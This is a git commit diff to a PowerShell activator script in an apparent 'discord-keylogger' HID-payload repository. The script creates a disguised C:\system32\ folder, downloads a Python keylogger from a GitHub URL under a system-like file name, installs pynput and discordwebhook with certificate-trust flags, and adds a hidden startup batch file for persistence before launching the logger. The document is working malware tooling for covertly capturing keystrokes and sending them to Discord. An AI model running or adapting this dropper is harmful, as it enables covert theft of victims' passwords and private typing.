34a0280fe78dbd44ee9e087528af16379a644d3a
Simen <97337442+simen64@users.noreply.github.com>
2024-03-29 22:39:32 +0100

    Added some minor improvements

--- discord-keylogger/keylog-activator.ps1
+++ discord-keylogger/keylog-activator.ps1
@@ -1,13 +1,12 @@
-mkdir 'C:\system32\'
+New-Item -ItemType Directory -Path 'C:\system32\' -Force
 
 cd C:\system32\
 
 iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py
 
-py -m pip install discordwebhook pynput
+python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org discordwebhook pynput --user
 
-'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
-
-Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" -Force
+'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
 
 Python sys-file.py $dc
